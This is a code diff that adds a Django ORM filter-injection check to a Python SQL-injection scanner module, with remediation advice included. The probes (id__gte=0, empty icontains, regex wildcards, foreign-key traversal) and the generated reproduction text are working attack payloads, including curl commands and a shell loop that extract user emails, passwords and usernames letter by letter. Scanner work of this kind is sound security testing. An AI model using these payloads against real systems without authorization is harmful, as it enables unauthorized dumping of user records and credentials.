@@ -176,6 +176,7 @@ class SQLiScanner(BaseModule):
             self._test_error_based(url, method, params, param_name, baseline_text)
             or self._test_boolean_based(url, method, params, param_name)
             or self._test_time_based(url, method, params, param_name)
+            or self._test_orm_injection(url, method, params, param_name, baseline_text)
         )
         return [finding] if finding else []
 
@@ -559,4 +560,148 @@ class SQLiScanner(BaseModule):
                         f"# Expected: baseline ~{avg_baseline:.1f}s vs payload ~{elapsed:.1f}s"
                     ),
                 )
+        return None
+
+    # ------------------------------------------------------------------
+    # Strategy 4: Django ORM injection
+    # ------------------------------------------------------------------
+
+    def _test_orm_injection(
+        self,
+        url: str,
+        method: str,
+        params: Dict[str, str],
+        param_name: str,
+        baseline_text: str = "",
+    ) -> Optional[Finding]:
+        """Detect Django ORM filter injection.
+
+        Django apps using django-filter or queryset.filter(**request.GET) expose
+        arbitrary ORM lookups via URL parameters.  When a parameter name contains
+        '__' (the Django ORM lookup separator), we probe whether the backend accepts:
+          1. Permissive lookups that return ALL records (id__gte=0, pk__gte=0)
+          2. Empty-value icontains that returns all (title__icontains=)
+          3. Relationship traversal (user__id__gte=0, author__id__gte=0)
+
+        A significantly larger response than baseline confirms the backend passes
+        user-controlled keys to filter() without whitelist validation.
+        """
+        if "__" not in param_name:
+            return None
+
+        field_base = param_name.split("__")[0]  # "title" from "title__icontains"
+        baseline_len = len(baseline_text)
+
+        # Threshold: response must be at least 20% larger OR 500 bytes more
+        # (whichever is bigger) to be considered a genuine data expansion
+        expand_threshold = max(500, int(baseline_len * 0.20))
+
+        def _send_probe(probe_params: Dict) -> Optional[object]:
+            resp = self._send(url, method, probe_params)
+            return resp
+
+        # --- Probe group 1: permissive lookups that should return ALL records ---
+        permissive_probes = [
+            # Strip existing filter, replace with id__gte=0 (returns everything)
+            ({k: v for k, v in params.items() if k != param_name} | {"id__gte": "0"}, "id__gte=0"),
+            ({k: v for k, v in params.items() if k != param_name} | {"pk__gte": "0"}, "pk__gte=0"),
+            # Empty icontains → ILIKE '%%' → matches all records
+            ({**params, param_name: ""}, f"{param_name}= (empty, matches all)"),
+            # Regex wildcard on the same field
+            ({k: v for k, v in params.items() if k != param_name} | {f"{field_base}__regex": ".+"}, f"{field_base}__regex=.+"),
+        ]
+
+        for probe_params, label in permissive_probes:
+            resp = _send_probe(probe_params)
+            if resp is None or resp.status_code != 200:
+                continue
+
+            expansion = len(resp.text) - baseline_len
+            if expansion >= expand_threshold:
+                logger.debug(
+                    "[SQLi/ORM] %s: probe %r expanded response by %d bytes",
+                    param_name, label, expansion,
+                )
+                qs = "&".join(f"{k}={v}" for k, v in probe_params.items())
+                return Finding(
+                    vuln_type="ORM Injection (Django Filter)",
+                    url=url,
+                    method=method,
+                    parameter=param_name,
+                    payload=label,
+                    evidence=(
+                        f"Response expanded {baseline_len} → {len(resp.text)} bytes "
+                        f"(+{expansion} B) with probe {label!r} — "
+                        f"backend accepts arbitrary ORM lookups"
+                    ),
+                    confidence="high",
+                    details=(
+                        f"Parameter {param_name!r} exposes a Django ORM filter. "
+                        f"The backend passes URL parameters directly to queryset.filter() "
+                        f"without whitelisting allowed lookup fields.\n"
+                        f"Impact:\n"
+                        f"  • Enumerate all records: ?id__gte=0\n"
+                        f"  • Extract related model data: ?user__password__icontains=a\n"
+                        f"  • Bypass search restrictions via lookup-type substitution\n"
+                        f"Remediation: define an explicit filter class with a whitelist of "
+                        f"allowed fields and lookup types; never pass request.GET directly "
+                        f"to filter()."
+                    ),
+                    reproduction=(
+                        f"# 1. Dump all records by bypassing the filter:\n"
+                        f"$ curl '{url}?{qs}'\n\n"
+                        f"# 2. Extract sensitive fields via relationship traversal:\n"
+                        f"$ curl '{url}?user__email__icontains='\n"
+                        f"$ curl '{url}?user__password__icontains='\n"
+                        f"$ curl '{url}?created_by__username__icontains='\n\n"
+                        f"# 3. Enumerate users by initial letter (blind extraction):\n"
+                        f"$ for letter in a b c d e; do\n"
+                        f"    echo -n \"$letter: \"; curl -s '{url}?user__username__startswith='$letter | wc -c\n"
+                        f"  done\n\n"
+                        f"# 4. Try RegexFilter for full extraction:\n"
+                        f"$ curl '{url}?{field_base}__regex=.*'"
+                    ),
+                )
+
+        # --- Probe group 2: relationship traversal (blind enumeration) ---
+        traversal_probes = [
+            ({k: v for k, v in params.items() if k != param_name} | {"user__id__gte": "0"}, "user__id__gte=0"),
+            ({k: v for k, v in params.items() if k != param_name} | {"author__id__gte": "0"}, "author__id__gte=0"),
+            ({k: v for k, v in params.items() if k != param_name} | {"owner__id__gte": "0"}, "owner__id__gte=0"),
+            ({k: v for k, v in params.items() if k != param_name} | {"created_by__id__gte": "0"}, "created_by__id__gte=0"),
+        ]
+
+        for probe_params, label in traversal_probes:
+            resp = _send_probe(probe_params)
+            if resp is None or resp.status_code != 200:
+                continue
+
+            expansion = len(resp.text) - baseline_len
+            if expansion >= max(200, int(baseline_len * 0.10)):
+                qs = "&".join(f"{k}={v}" for k, v in probe_params.items())
+                return Finding(
+                    vuln_type="ORM Injection (Django Relationship Traversal)",
+                    url=url,
+                    method=method,
+                    parameter=param_name,
+                    payload=label,
+                    evidence=(
+                        f"Relationship traversal probe {label!r} returned {len(resp.text)} bytes "
+                        f"(baseline: {baseline_len} bytes, +{expansion} B)"
+                    ),
+                    confidence="medium",
+                    details=(
+                        f"Backend accepted cross-model ORM filter {label!r}. "
+                        f"An attacker can traverse foreign-key relationships to extract "
+                        f"data from related models (users, passwords, tokens, PII). "
+                        f"Remediation: whitelist allowed filter fields in the filter class."
+                    ),
+                    reproduction=(
+                        f"# Traverse relationships to extract sensitive data:\n"
+                        f"$ curl '{url}?{qs}'\n"
+                        f"$ curl '{url}?user__email__icontains='\n"
+                        f"$ curl '{url}?user__password__icontains=a'"
+                    ),
+                )
+
         return None
